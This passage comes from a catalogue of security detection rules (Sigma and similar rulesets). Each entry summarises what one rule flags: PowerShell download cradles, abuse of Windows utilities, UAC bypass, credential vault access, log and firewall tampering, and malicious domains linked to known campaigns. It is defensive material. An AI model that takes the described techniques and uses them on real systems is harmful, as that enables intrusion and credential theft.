  Rule-Body-Hash: 532100d5af7be8733f024494792bcc80
  Ruleset: sigmahq
  Summary: This rule detects the use of MSPUB.EXE (Microsoft Publisher) for downloading
    arbitrary files from URLs using protocols such as FTP, HTTP, or HTTPS. This behavior
    might be indicative of defense evasion or malicious execution, as MSPUB.EXE is
    not typically associated with file download activities. Detection hinges on identifying
    the process creation of MSPUB.EXE combined with command-line arguments referencing
    the specified URL protocols.
  Updated-Date: '2024_09_04'
3b4b232a-af90-427c-a22f-30b0c0837b95:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 75b1f1b13bba093e374f975c37e49061
  Ruleset: core
  Summary: This rule detects various indicators of the execution of the Microsoft
    Connection Manager Profile Installer (CMSTP). Specifically, it identifies the
    presence of the 'cmlua.dll' in the process access call trace, which is a common
    behavior associated with CMSTP. CMSTP can be used for code execution and User
    Account Control (UAC) bypass, tactics often employed in defense evasion and execution
    phases of attacks by advanced persistent threat groups G0069 and G0080. Legitimate
    usage of CMSTP in modern enterprise environments is considered unlikely, hence
    the high level of scrutiny associated with this detection.
  Updated-Date: '2024_09_03'
3b5b0213-0460-4e3f-8937-3abf98ff7dcc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6ae3a40d7fc112b51e03993473aa0e02
  Ruleset: sigmahq
  Summary: This rule detects a suspicious process where the `rundll32.exe` executable
    calls the `user32.dll` function to lock a user workstation, often indicative of
    defense evasion tactics. The detection focuses on instances where `rundll32.exe`
    is executed by `cmd.exe` and the command line includes `user32.dll` and `LockWorkStation`.
    False positives may include legitimate scripts or shortcuts created by users to
    lock their workstation.
  Updated-Date: '2024_09_04'
3b5ba899-9842-4bc2-acc2-12308498bf42:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e7c478ffc4f98f43056e783dc1907762
  Ruleset: sigmahq
  Summary: This rule detects when an Office suite application, such as Word, Excel,
    PowerPoint, or Outlook, initiates network communication over uncommon ports. It
    focuses on identifying unexpected network behavior that could indicate malicious
    activities, such as data exfiltration or communication with a command-and-control
    server, by flagging traffic that does not occur over standard ports like DNS,
    HTTP, HTTPS, NETBIOS, and SMTP-related ports.
  Updated-Date: '2024_09_04'
3b6ab547-8ec2-4991-b9d2-2b06702a48d7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 633d3c1f58fa862e4d0dd49b74ddd33f
  Ruleset: sigmahq
  Summary: This rule detects a PowerShell process that includes download commands
    in its command line string. Specifically, it identifies instances where PowerShell
    uses 'new-object' in conjunction with 'net.webclient)' and 'download', with additional
    context provided by strings such as 'string(' or 'file('. This pattern is indicative
    of common tactics used by malware, including ransomware like Black Kingdom and
    tools used in cyber espionage campaigns, to download and execute malicious payloads
    on a Windows system.
  Updated-Date: '2024_09_04'
3b8e5084-4de9-449a-a40d-0e11014f2e2d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 681c4b6cef7b98439cdb3de3360a3979
  Ruleset: emerging-threats
  Summary: This rule detects a registry event indicating the creation of a scheduled
    task associated with the Diamond Sleet Advanced Persistent Threat (APT). This
    activity is specifically linked to the exploitation of the TeamCity CVE-2023-42793
    vulnerability. The rule identifies Event ID 4698 and looks for the task named
    '\Windows TeamCity Settings User Interface,' with task content containing 'uTYNkfKxHiZrx3KJ'.
    This detection is crucial for identifying malicious persistence, privilege escalation,
    and execution attempts by Diamond Sleet APT on Windows systems.
  Updated-Date: '2024_09_03'
3bad990e-4848-4a78-9530-b427d854aac0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d2f08005a186dca86026af3c3abca948
  Ruleset: sigmahq
  Summary: This rule detects the execution of "dsquery.exe" specifically used for
    domain trust discovery activities. "Dsquery.exe" is a command-line tool in Windows
    used for querying Active Directory. The rule focuses on instances where this utility
    is invoked with parameters related to 'trustedDomain' in the command line, which
    indicates attempts to discover trusts between domains. Such behavior can be pertinent
    to security monitoring as it could signify reconnaissance activities by unauthorized
    users or attackers within the network. Despite this, legitimate administrators
    may also execute the tool for valid purposes, which should be taken into consideration
    to avoid false positives.
  Updated-Date: '2024_09_04'
3be619f4-d9ec-4ea8-a173-18fdd01996ab:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e0f436d60c5bf75dc8e3502a52906f06
  Ruleset: sigmahq
  Summary: This rule detects the use of commands to flush all firewall rules, tables,
    and chains using iptables and similar utilities, thereby allowing unrestricted
    network traffic. It monitors the execution of specific binaries like iptables,
    xtables-legacy-multi, and their IPv6 counterparts, checking if they are used with
    command-line parameters that indicate flushing actions (-F, -Z, -X). Additionally,
    it looks for command-line usage related to UFW (Uncomplicated Firewall) logging
    options like 'ufw-logging-deny' and 'ufw-logging-allow' to identify potential
    tampering with firewall settings. This rule helps in identifying defense evasion
    attempts by unauthorized users or malicious actors.
  Updated-Date: '2024_09_04'
3be82d5d-09fe-4d6a-a275-0d40d234d324:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 96a17acc9153304f44161a62da9113c3
  Ruleset: emerging-threats
  Summary: This rule detects the exploitation behavior of a local privilege escalation
    (LPE) vulnerability identified as CVE-2021-41379. Specifically, it monitors for
    the `msiexec.exe` process creating a file named `elevation_service.exe` within
    the Microsoft Edge application's directory. This activity indicates a potential
    exploitation attempt where the installer file takeover technique is used to gain
    elevated privileges.
  Updated-Date: '2024_09_03'
3bf1d859-3a7e-44cb-8809-a99e066d3478:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e2101ed5814c798380ee0617f5dbca98
  Ruleset: core
  Summary: This rule detects PowerShell scripts that attempt to modify Access Control
    Lists (ACLs) on files within the Windows folder. The detection focuses on the
    usage of the Set-Acl cmdlet combined with specific path references to directories
    within the Windows folder, as well as the intention to set permissions like 'FullControl'
    or 'Allow'. This activity is indicative of potential defense evasion tactics commonly
    associated with malicious actions.
  Updated-Date: '2024_09_03'
3c05e90d-7eba-4324-9972-5d7f711a60a8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 66f5d7afcd48c78af03433ed255a2a17
  Ruleset: core
  Summary: This rule detects the use of tools such as UACMe which are used to bypass
    User Account Control (UAC) by exploiting computerdefaults.exe. UACMe is known
    for leveraging techniques to perform unauthorized privilege escalation on Windows
    systems.
  Updated-Date: '2024_09_03'
3c1b5fb0-c72f-45ba-abd1-4d4c353144ab:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b07c79514b9bf70b2d6dad1a0686db8d
  Ruleset: sigmahq
  Summary: This rule detects process creation events that utilize the Sysnative folder,
    a method commonly associated with CobaltStrike spawns. CobaltStrike is a known
    penetration testing tool often used by attackers for defense evasion and privilege
    escalation. The detection focuses on the presence of the Sysnative path in the
    command line or image fields of process creation logs on Windows systems, indicating
    potential malicious activity.
  Updated-Date: '2024_09_04'
3c4b3bbf-36b4-470c-b6cf-f07e8b1c7e26:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 91cdaf4d389be431d6c18fe88889276a
  Ruleset: emerging-threats
  Summary: This rule detects potential beaconing activity to specific domains associated
    with the compromised 3CXDesktopApp. Beaconing is a type of communication where
    compromised systems regularly contact a remote server controlled by an attacker
    for instructions or to exfiltrate data. The rule identifies traffic patterns to
    domains such as akamaicontainer.com, azuredeploystore.com, msstorageboxes.com,
    and others indicative of malicious activity related to the 3CXDesktopApp compromise.
    The detection focuses on logs from proxy servers that show these connections.
    Such beaconing activity is typically a sign of command-and-control operations,
    and this rule aims to flag these occurrences for immediate investigation.
  Updated-Date: '2024_09_03'
3c7d1587-3b13-439f-9941-7d14313dbdfe:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f87010978f125a207e8cac887e749729
  Ruleset: sigmahq
  Summary: This rule detects the usage of COM objects that can be exploited to download
    files within PowerShell scripts by identifying specific CLSID values. It monitors
    for the presence of the '[Type]::GetTypeFromCLSID(' function in PowerShell ScriptBlockText,
    which is indicative of the misuse of COM objects for potentially malicious activities.
    The detection looks for several specific CLSID identifiers, known to be associated
    with this type of behavior. While legitimate use of these libraries may trigger
    the rule, the behavior often corresponds with command-and-control tactics.
  Updated-Date: '2024_09_04'
3c89a1e8-0fba-449e-8f1b-8409d6267ec8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0aea2724c5279fede61ccde3b5a04fd2
  Ruleset: core
  Summary: This rule detects suspicious process creations initiated via WMIC (Windows
    Management Instrumentation Command-line) using the command "process call create."
    It identifies processes such as "rundll32," "regsvr32," "bitsadmin," and several
    command-line executions like "cmd.exe /c" and "cmd.exe /k," as well as the use
    of scripting engines such as "powershell," "certutil," "cscript," "wscript," and
    "mshta." Additionally, it flags the execution of processes from potentially suspicious
    directories including "\Users\Public\", "\Windows\Temp\", and environment variables
    like "%temp%", "%ProgramData%", and "%appdata%." The detection criteria are designed
    to identify potentially malicious activities often associated with the initial
    stages of ransomware like Ryuk, Hive, Conti, and AvosLocker.
  Updated-Date: '2024_09_03'
3ce8e9a4-bc61-4c9b-8e69-d7e2492a8781:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fa8d02f232c1f1c89766fada1b5d221e
  Ruleset: sigmahq
  Summary: This rule detects situations where an attacker enables the OpenSSH server
    on a Windows system, causing it to start listening on an SSH socket. This activity
    could indicate potential lateral movement attempts by an adversary.
  Updated-Date: '2024_09_04'
3ceb2083-a27f-449a-be33-14ec1b7cc973:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d1d01158394ea7ec5ce0f59d1bc367f6
  Ruleset: core
  Summary: This rule detects the presence of Silence EmpireDNSAgent malware, which
    is used by the Silence cybercriminal group for execution and command-and-control
    activities. The detection focuses on identifying suspicious PowerShell script
    block texts that include specific commands and function calls. These texts are
    indicative of the malware's processes, such as stopping and restarting computers,
    handling execution exceptions, and managing DNS communication tunnels. By monitoring
    for key phrases and patterns, the rule aims to identify malicious activities involving
    EmpireDNSAgent to mitigate the risk of system compromise.
  Updated-Date: '2024_09_03'
3ced239c-7285-4b54-99c4-8525b69293f7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8a7e6985037996cbae3f390205956c57
  Ruleset: emerging-threats
  Summary: This rule detects the creation of new services that may be associated with
    the COLDSTEEL Remote Access Trojan (RAT) on Windows systems. Specifically, it
    identifies logs from the Service Control Manager with Event ID 7045 where the
    service names are 'Name', 'msupdate', or 'msupdate2', and the image path contains
    '\Windows\System32\svchost.exe'. This activity indicates potential defense evasion
    and persistence techniques used by the malware.
  Updated-Date: '2024_09_03'
3d0ed417-3d94-4963-a562-4a92c940656a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 12096dfbf04203931614760d07c3f943
  Ruleset: sigmahq
  Summary: This rule detects the creation of a .diagcab file, which could either originate
    from a legitimate installer or indicate potential exploitation. It advises reviewing
    the filename and its location to determine the context of the file creation.
  Updated-Date: '2024_09_04'
3d27f6dd-1c74-4687-b4fa-ca849d128d1c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cf3b1d65fcf6e99141540722965b5d84
  Ruleset: sigmahq
  Summary: This rule detects the addition of a specific registry key that allows a
    user to specify an arbitrary DLL, which will be executed every time an Office
    application is started. This registry key is associated with persistence methods
    used in attacks, such as those attributed to the Sofacy group, which leverage
    this mechanism to maintain access to a compromised system whenever an Office application
    is launched.
  Updated-Date: '2024_09_04'
3d2a2d59-929c-4b78-8c1a-145dfe9e07b1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3acff50de57e521b7d5a5a4ce4a28f0a
  Ruleset: sigmahq
  Summary: This rule detects the creation of files with the ".pub" extension in suspicious
    or uncommon locations on a Windows system, such as directories like "\AppData\Local\Temp\",
    "\Users\Public\", "\Windows\Temp\", and "C:\Temp\". The presence of Publisher
    document files in these locations could indicate that attackers are abusing Publisher
    documents for malicious purposes.
  Updated-Date: '2024_09_04'
3d48c9d3-1aa6-418d-98d3-8fd3c01a564e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f637c7a0a6de2b13772f159a46c6ba29
  Ruleset: sigmahq
  Summary: This rule detects the creation of child processes by "Mftrace.exe," a Trace
    log generation tool for Media Foundation Tools. The detection aims to identify
    potential abuse of this executable to run arbitrary binaries, which could be used
    for malicious purposes such as defense evasion.
  Updated-Date: '2024_09_04'
3d4aebe0-6d29-45b2-a8a4-3dfde586a26d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: aff5e20892518e614bb89e44ef601738
  Ruleset: emerging-threats
  Summary: This rule detects the invocation of the Archer malware via the Windows
    utility "rundll32.exe" with the specific command line containing "InstallArcherSvc."
    The Archer malware is known for its execution and defense evasion capabilities.
    Detection is based on process creation events with specific strings in the command
    line.
  Updated-Date: '2024_09_03'
3da70954-0f2c-4103-adff-b7440368f50e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cda352b2d8d6afdca7a9d3680837bedb
  Ruleset: sigmahq
  Summary: This rule detects the creation of the PROCEXP152.sys file in the local
    temporary folder of the application data. This driver is associated with Sysinternals
    Process Explorer but can also be used by KDU or Ghost-In-The-Logs. The detection
    avoids matching on known legitimate instances of the driver used by specific executable
    files.
  Updated-Date: '2024_09_04'
3db10f25-2527-4b79-8d4b-471eb900ee29:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2063bc2d120745f1fa63522a003387a8
  Ruleset: emerging-threats
  Summary: This rule detects artefacts associated with the GALLIUM activity group,
    specifically leveraging indicators released by the Microsoft Threat Intelligence
    Center in December 2019. The rule monitors Windows DNS Server Analytic logs for
    Event ID 257 and identifies suspicious domain names such as 'asyspy256.ddns.net',
    'hotkillmail9sddcc.ddns.net', and several others. These domains are linked to
    the GALLIUM group, which targets global telecommunications organizations. Detection
    of these domains may indicate credential access or command-and-control activities.
  Updated-Date: '2024_09_03'
3df95076-9e78-4e63-accb-16699c3b74f8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ee17256bf9b09c4d4ad918ea89a4d5d3
  Ruleset: emerging-threats
  Summary: This rule detects access to a file share using a naming schema associated
    with the exploitation of CVE-2023-36884. This vulnerability has been observed
    in attacks specifically targeting entities involved in Ukraine and NATO membership
    discussions, as detailed in cybersecurity reports. The rule monitors for Windows
    security events where the share name or path contains specific patterns, such
    as "\MSHTML_C7\" or an IPv4 address format, which are indicative of this exploitation
    activity.
  Updated-Date: '2024_09_03'
3dfd06d2-eaf4-4532-9555-68aca59f57c4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0a9b199c3228ec01664d7a88b5b4a708
  Ruleset: core
  Summary: This rule detects the execution of processes from potentially suspicious
    and uncommon folders on a Windows system. The specific directories monitored include
    various system and user-related paths such as `\Perflogs`, `\Users\All Users`,
    `\Windows\Fonts`, `$Recycle.bin`, and others. Executions from these locations
    may indicate potential malicious activity, as legitimate software typically does
    not operate from these directories. Certain paths related to known, legitimate
    software such as IBM Client Solutions or Citrix Updater are excluded from triggering
    this detection to minimize false positives.
  Updated-Date: '2024_09_03'
3e3ceccd-6c06-48b8-b5ff-ab1d25db8c1d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 64a9191593f9a7fec2fbdb8936fc381d
  Ruleset: sigmahq
  Summary: This rule detects the execution of WMIC (Windows Management Instrumentation
    Command-line) tool with the "csproduct" parameter. The use of "csproduct" in WMIC
    is typically employed to obtain specific information about the hardware, such
    as the computer's model and vendor details. This activity could potentially be
    indicative of reconnaissance efforts to gather information about the hardware
    configuration in a Windows environment.
  Updated-Date: '2024_09_04'
3e8207c5-fcd2-4ea6-9418-15d45b4890e4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6589160e2bb4ff86a375448b801058a7
  Ruleset: core
  Summary: This rule detects instances where Chromium-based browsers, such as Google
    Chrome or Microsoft Edge, are launched in headless mode with remote debugging
    enabled and pointing to a user profile. This combination of command-line parameters
    may indicate data theft or unauthorized remote control activities.
  Updated-Date: '2024_09_03'
3eaf6218-3bed-4d8a-8707-274096f12a18:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5c00655cf5e4e6f7041db331ab240cb4
  Ruleset: core
  Summary: This rule detects DNS queries to specific domains associated with the Wannacry
    ransomware's killswitch mechanism. The identified domains include 'ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.testing',
    'ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.test', 'ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com',
    'ayylmaotjhsstasdfasdfasdfasdfasdfasdfasdf.com', and 'iuqssfsodp9ifjaposdfjhgosurijfaewrwergwea.com'.
    Monitoring these queries is crucial as they are indicative of the Wannacry ransomware
    attempting to activate its killswitch.
  Updated-Date: '2024_09_03'
3eb8c339-a765-48cc-a150-4364c04652bf:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 00488c198430b3c17eaaa874dc101d53
  Ruleset: sigmahq
  Summary: This rule detects the deletion of IIS WebServer access logs, which may
    indicate an attempt to destroy forensic evidence. Detecting such deletions is
    crucial as it falls under defense evasion techniques commonly employed in cyber
    attacks. The condition triggers when files within the '\inetpub\logs\LogFiles\'
    directory that end with '.log' are deleted. This could occur during legitimate
    activities like uninstalling the IIS service or during log rotation.
  Updated-Date: '2024_09_04'
3eb91f0a-0060-424a-a676-59f5fdd75610:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6d3ac7da7e09885553b0f04203b071e9
  Ruleset: emerging-threats
  Summary: This rule detects potential initial exploitation attempts targeting VMware
    Horizon deployments running a vulnerable version of Log4j. The detection focuses
    on identifying processes spawned by the Tomcat service, specifically looking for
    the execution of shell commands through cmd.exe or powershell.exe. The rule aims
    to identify suspicious activities that may indicate an exploitation attempt related
    to CVE-2021-44228.
  Updated-Date: '2024_09_03'
3ec9a16d-0b4f-4967-9542-ebf38ceac7dd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c146d9ffb87786c5733a9efc6bc53434
  Ruleset: sigmahq
  Summary: This rule detects instances where an MSSQL service on an OpenCanary node
    has experienced a login attempt using SQL authentication (SQLAuth). OpenCanary
    is a network security tool used to simulate various services to detect unauthorized
    access attempts, making this rule helpful in identifying potential credential
    access or collection attacks on MSSQL services.
  Updated-Date: '2024_09_04'
3ef5605c-9eb9-47b0-9a71-b727e6aa5c3b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5d1f14ec9f8014bcff7d973e5d049467
  Ruleset: sigmahq
  Summary: This rule detects the use of NTFS 8.3 short filenames in Windows process
    creation, which may be used as a method to evade image-based detection. It identifies
    the presence of filenames with short names such as '~1.bat', '~1.dll', '~1.exe',
    among others. The rule filters out processes if they are spawned by common parent
    processes like 'C:\Windows\explorer.exe' and certain specific known software executables
    like WebEx Host, Thor scanner, WinZip, and VC redistributable installers. False
    positives may include legitimate software installers.
  Updated-Date: '2024_09_04'
3f3f3506-1895-401b-9cc3-e86b16e630d0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 589163f4a7089a48d9c097f38535c4fd
  Ruleset: sigmahq
  Summary: This rule detects potential calls to the NtOpenProcess function directly
    from the NTDLL dynamic link library, which may indicate malicious activity. The
    detection focuses on identifying suspicious 'CallTrace' patterns that start with
    'UNKNOWN' and excludes processes commonly involved in legitimate operations, such
    as those related to system files and standard software installations. Filters
    are employed to omit benign processes from vendors like VMware, Microsoft, Cylance,
    Amazon, Discord, Yammer, Evernote, and Adobe Acrobat to reduce false positives.
    This helps in pinpointing genuine threats while minimizing noise from legitimate
    process activities.
  Updated-Date: '2024_09_04'
3f5491e2-8db8-496b-9e95-1029fce852d4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 04a514f1c2a5b3daee98c09635851884
  Ruleset: sigmahq
  Summary: This rule detects the execution of "odbcconf.exe" with the "INSTALLDRIVER"
    command, which installs a new ODBC driver. Attackers can exploit this to install
    and run malicious DLLs. The rule is triggered when the command line includes both
    "INSTALLDRIVER" and a ".dll" reference, indicating potential unauthorized driver
    installations. While legitimate driver DLL registrations using "odbcconf" can
    trigger the rule, investigation of the DLL path and contents will help determine
    if the activity is authorized.
  Updated-Date: '2024_09_04'
3f6b7b62-61aa-45db-96bd-9c31b36b653c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 03a300f7fa08c099512923410812d912
  Ruleset: core
  Summary: This rule detects tampering with Remote Desktop Protocol (RDP) Terminal
    Services or Server sensitive settings. It flags changes to registry keys relevant
    to enabling or disabling RDP, or altering its security and functionality settings.
    Specifically, it monitors modifications to keys that allow unsolicited remote
    assistance offers, disable remote desktop security settings, or specify programs
    to run automatically upon a user's remote login. Additionally, it includes checks
    for configurations that enable or control shadowing, which is the ability to view
    or control user sessions remotely. This rule aims to identify unauthorized or
    suspicious alterations often indicative of malicious activities, such as those
    performed by the DarkGate malware, which tampers with RDP settings to facilitate
    unauthorized access.
  Updated-Date: '2024_09_03'
3f7f5b0b-5b16-476c-a85f-ab477f6dd24b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 831fc3e39ce4dca6e3ad14ede6489933
  Ruleset: emerging-threats
  Summary: This rule detects binaries associated with the Lazarus group that use names
    of system executables but are executed from non-default locations. These binaries
    attempt to disguise themselves by using standard system names such as 'msdtc.exe'
    and 'gpsvc.exe', yet their location outside expected directories like 'C:\Windows\System32\'
    and 'C:\Windows\SysWOW64\' signals potential malicious activity. The rule aims
    to identify such defense evasion tactics commonly employed by this threat group.
  Updated-Date: '2024_09_03'
3fcc9b35-39e4-44c0-a2ad-9e82b6902b31:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 003eecb2de74425282c50f9720b88af6
  Ruleset: core
  Summary: This rule detects specific commands used to remove or empty the syslog
    on Linux systems. Such actions are commonly associated with attackers attempting
    to hide their activities by erasing evidence. Monitored commands include variations
    on the `rm` and `unlink` commands directed at the syslog file, as well as redirection
    operations (`>`) targeting the syslog file.
  Updated-Date: '2024_09_03'
3fd4c8d7-8362-4557-a8e6-83b29cc0d724:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0bdc9f6e5f1102587e778ac9a738fec3
  Ruleset: core
  Summary: This rule detects changes to Internet Explorer's ZoneMap configuration,
    specifically for the "HTTP" and "HTTPS" protocols, to the "My Computer" zone.
    Such a modification allows downloaded files from the Internet to be treated with
    the same level of trust as locally stored files. This action compromises security
    by granting excessive trust to potentially unsafe internet content.
  Updated-Date: '2024_09_03'
3ffd6f51-e6c1-47b7-94b4-c1e61d4117c5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c597db70797d24eeae869ca063136b10
  Ruleset: sigmahq
  Summary: This rule detects the execution of the CertUtil utility with the "exportPFX"
    flag, which allows the export of certificates. The detection focuses on identifying
    the process creation of certutil.exe and command lines containing "-exportPFX".
    CertUtil is a command-line program used for managing certificates in Windows.
    This activity could be related to defense evasion techniques and should be investigated
    to determine if the certificate export is legitimate or malicious.
  Updated-Date: '2024_09_04'
401e5d00-b944-11ea-8f9a-00163ecd60ae:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 336a87da4071617897570bded453059e
  Ruleset: sigmahq
  Summary: This rule detects instances where files that were not allowed to run are
    executed. It utilizes Applocker, a tool designed for application control, particularly
    useful on servers accessed by unprivileged users, such as terminal servers. The
    rule monitors specific Event IDs associated with Applocker to flag these unauthorized
    execution attempts and includes details about the blocked file, such as its path,
    hash, and associated user.
  Updated-Date: '2024_09_04'
402e1e1d-ad59-47b6-bf80-1ee44985b3a7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0edd7bad77c9ad0c122ff745018569aa
  Ruleset: core
  Summary: This rule detects the usage of specific Commandlet names from ShellIntel
    exploitation scripts in Windows PowerShell environments. The identified Commandlets
    include 'Invoke-SMBAutoBrute', 'Invoke-GPOLinks', and 'Invoke-Potato'. These Commandlets
    are part of exploitation frameworks that can be used for malicious activities,
    such as automated brute force attacks on SMB (Server Message Block) services and
    leveraging vulnerabilities to escalate privileges. Monitoring Script Block Logging
    is essential for identifying the execution of these potentially harmful scripts.
  Updated-Date: '2024_09_03'
403c2cc0-7f6b-4925-9423-bfa573bed7eb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a5c6991b12c2c6457bdb838caaba17dd
  Ruleset: sigmahq
  Summary: This rule detects suspicious PowerShell commands that are used to download
    content from the internet, specifically utilizing the `System.Net.WebClient` class.
    It looks for script block text containing methods such as `.DownloadFile`, `.DownloadFileAsync`,
    `.DownloadString`, and `.DownloadStringAsync`. These methods are commonly used
    to retrieve files or data from web sources, which can be indicative of malicious
    activity if executed unexpectedly.
  Updated-Date: '2024_09_04'
407aecb1-e762-4acf-8c7b-d087bcff3bb6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b5cc79b4eecb4a41d136a784fc3a307f
  Ruleset: sigmahq
  Summary: This rule detects suspicious processes accessing the Windows Credential
    Manager and vault from uncommon locations, which may indicate credential stealing
    activities. An example is the use of the "dpapi::cred" function in Mimikatz, a
    well-known post-exploitation tool used for extracting credentials. The rule focuses
    on detecting access attempts in specific directories such as '\AppData\Local\Microsoft\Credentials\',
    '\AppData\Roaming\Microsoft\Credentials\', '\AppData\Local\Microsoft\Vault\',
    and '\ProgramData\Microsoft\Vault\'. It filters out legitimate software usually
    found in standard system directories like 'C:\Program Files\', 'C:\Program Files
    (x86)\', 'C:\Windows\system32\', and 'C:\Windows\SysWOW64\'. False positives can
    occur if legitimate software installed in user directories accesses these files.
  Updated-Date: '2024_09_04'
4096842a-8f9f-4d36-92b4-d0b2a62f9b2a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c6d7451b6c49ea9f949b409f40b4fd05
  Ruleset: sigmahq
  Summary: This rule detects the usage of the Windows Remote Procedure Call (RPC)
    library for the Encrypting File System Remote Protocol (MS-EFSRPC). This particular
    RPC function is infrequently used and its appearance may indicate a PetitPotam
    attack, a known exploit strategy. Monitoring the activity of this RPC function
    can help identify potential security threats, warranting further investigation
    to ascertain the legitimacy of the usage. Analysis of surrounding logs from the
    source IP, including dce_rpc, smb_mapping, smb_files, rdp, ntlm, and kerberos,
    may provide additional context and aid in the identification of any malicious
    activity.
  Updated-Date: '2024_09_04'
409f8a98-4496-4aaa-818a-c931c0a8b832:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 68372d9e261607fa5ed9c0e19a9bf4ad
  Ruleset: sigmahq
  Summary: This rule detects suspicious files created by Microsoft Sync Center (mobsync),
    specifically targeting scenarios where mobsync.exe is used to create files with
    .dll or .exe extensions. This could indicate potential malicious activities such
    as execution or defense evasion tactics.
  Updated-Date: '2024_09_04'
40aa399c-7b02-4715-8e5f-73572b493f33:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3a60bf72b6c5dc4542ea2facb907d679
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious file downloads conducted directly
    from IP addresses using Wget.exe, a command-line utility widely used for retrieving
    files from web servers. The rule identifies when Wget.exe is invoked, specifies
    IP addresses within the command line, and includes HTTP references along with
    specific flags such as '-O' or '--output-document'. The detection extends to monitoring
    downloaded files saved in suspicious or atypical system directories, such as PerfLogs,
    Temp, Users/Public, Windows/Help, Windows/Temp, Temporary Internet, Favorites,
    Favourites, Contacts, and Pictures directories. This pattern suggests the use
    of Wget.exe for potentially nefarious activities involving unauthorized file storage
    locations.
  Updated-Date: '2024_09_04'
40b19fa6-d835-400c-b301-41f3a2baacaf:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 556364268688c51e43dfa91b012ce750
  Ruleset: core
  Summary: This rule detects the creation of symbolic links to shadow copies using
    the 'mklink' command in Windows operating systems. This activity can indicate
    an attempt to access or create shadow copies of a disk, which is a method often
    used by attackers for credential dumping.
  Updated-Date: '2024_09_03'
40b6e656-4e11-4c0c-8772-c1cc6dae34ce:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bdd9ec569c52982f673d0abe79886ea5
  Ruleset: sigmahq
  Summary: This rule detects the establishment of a registry key following the execution
    of a masqueraded .scr file using Rundll32 through desk.cpl. It identifies when
    the image rundll32.exe ends with this activity and the key changes under the path
